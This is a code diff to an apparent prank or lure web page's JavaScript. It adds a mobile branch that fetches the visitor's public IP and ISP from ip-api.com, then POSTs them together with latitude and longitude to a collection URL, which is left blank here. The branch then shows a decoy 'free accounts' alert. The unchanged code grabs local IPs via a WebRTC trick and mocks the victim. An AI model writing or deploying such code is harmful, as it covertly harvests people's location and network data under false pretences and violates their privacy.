@@ -23,6 +23,31 @@
 
 	function getip(lat, lon){
 
+		var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+		if (isMobile) {
+			var xhr = new XMLHttpRequest();
+			xhr.open('GET', 'http://ip-api.com/json', true);
+			xhr.onreadystatechange = function() {
+			if (this.readyState == 4 && this.status == 200) {
+				var myArr = JSON.parse(this.responseText);
+				var ipv4 = myArr['query'];
+				var isp = myArr['isp'];
+				var xhr = new XMLHttpRequest();
+				var yourUrl = '';
+				var data = 'locip='+ipv4+'&latitude='+lat+'&longitude='+lon+'&isp='+isp
+				xhr.open("POST", yourUrl, true);
+				xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+				xhr.send(data);
+				alert("Sorry, We have given away all free acoounts");
+				}
+			};
+			xhr.send(null);
+			
+		}
+
+
+		else{
+
 		window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;//compatibility for Firefox and chrome
 		var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
 		pc.createDataChannel('');//create a bogus data channel
@@ -43,7 +68,7 @@
 		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 		xhr.send(data);
 		alert("You've got no Crush you lonely dumbass");
-		}
+	}
 };
 
 		
